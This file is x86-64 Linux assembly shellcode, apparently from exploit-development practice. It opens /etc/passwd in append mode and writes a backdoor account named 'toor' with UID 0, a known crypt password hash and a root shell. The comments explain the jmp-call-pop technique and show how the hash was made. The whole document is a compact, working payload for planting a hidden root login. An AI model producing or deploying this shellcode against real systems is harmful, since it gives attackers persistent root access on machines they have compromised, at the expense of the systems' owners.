global _start
  
section .text
_start:
    ; #define __NR_open 2
    ; int open(const char *pathname, int flags);
    ; rax -> 2 
    ; rdi -> /etc/passwd
    ; rsi -> 0x401
    ; 
    ; >>> hex(os.O_WRONLY ^ os.O_APPEND)
    ; 0x401
    xor ebx, ebx
    mul ebx                         ; rax|rdx -> 0x0
    push rax 
    mov ebx, 0x647773ff             ; swd
    shr ebx, 0x08
    push rbx
    mov rbx, 0x7361702f6374652f     ; /etc/pas
    push rbx 
    mov rdi, rsp                    ; rdi -> /etc/passwd 
    xchg esi, edx                   ; swap registers to zero out rsi 
    mov si, 0x401                   ; rsi -> O_WRONLY|O_APPEND
    add al, 0x2                     ; rax -> 2 (open)
    syscall                         ; open 
  
    xchg rdi, rax                   ; save returned fd
      
    jmp short get_entry_address     ; start jmp-call-pop 
      
write_entry:
    ; #define __NR_write 1
    ; ssize_t write(int fd, const void *buf, size_t count);
    ; rax -> 1 
    ; rdi -> results of open syscall 
    ; rsi -> user's entry 
    ; rdx -> len of user's entry 
    pop rsi                         ; end jmp-call-pop, rsi -> user's entry  
    push 0x1                        
    pop rax                         ; rax -> 1
    push 38                         ; length + 1 for newline 
    pop rdx                         ; rdx -> length of user's entry 
    syscall                         ; write
  
    ; #define __NR_exit 60
    ; void _exit(int status);
    ; rax -> 60 
    ; rdi -> don't care 
    push 60
    pop rax
    syscall                         ; OS will handle closing fd at exit 
      
get_entry_address:
    call write_entry
    user_entry: db "toor:sXuCKi7k3Xh/s:0:0::/root:/bin/sh",0xa
    ; if the user_entry above is modified, change the _count_ argument in the write call to match the new length
    ; openssl passwd -crypt
    ; Password: toor
    ; Verifying - Password: toor
    ; sXuCKi7k3Xh/s
 
